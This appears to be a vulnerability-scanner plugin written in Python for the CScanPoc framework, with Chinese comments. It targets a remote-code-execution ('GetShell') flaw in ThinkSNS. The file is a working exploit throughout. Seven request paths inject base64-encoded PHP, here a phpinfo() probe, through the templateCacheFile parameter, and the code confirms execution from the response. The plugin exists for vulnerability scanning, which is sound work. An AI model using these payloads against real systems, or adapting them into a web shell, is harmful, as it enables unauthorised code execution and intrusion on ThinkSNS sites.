# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'ThinkSNS_0001'  # 平台漏洞编号，留空
    name = 'ThinkSNS 前台GetShell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2014-12-30'  # 漏洞公布时间
    desc = '''
        ThinkSNS开源社交网站APP系统,含微博,论坛,问答,即时聊天,资讯CMS,投票,礼物商城,商城等功能应用。
        ThinkSNS 前台GetShell 漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=081755'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ThinkSNS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ff8e473b-fd28-4a16-94c4-263cb6f60188'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload_list = [
                '/index.php?app=widget&mod=Denouce&act=index&aid=1&fuid=1&type=ztz&templateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D',
                '/index.php?app=widget&mod=Comment&act=addcomment&uid=1&app_name=public&table_name=user&content=test&row_id=1&app_detail_summary=1&templateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D',
                '/index.php?app=widget&mod=Department&act=change&templateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D',
                '/index.php?app=widget&mod=Diy&act=addWidget&templateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D',
                '/index.php?app=widget&mod=FeedList&act=loadMore&templateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D',
                '/index.php?app=widget&mod=FeedList&act=loadNew&templateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D&maxId=1',
                '/index.php?app=widget&mod=Remark&act=edit&templateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D'
            ]
            for payload in payload_list:
                url = arg + payload
                code, head, res, errcode, _ = hh.http(url)

                if code == '200':
                    if res.find('System') != -1:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
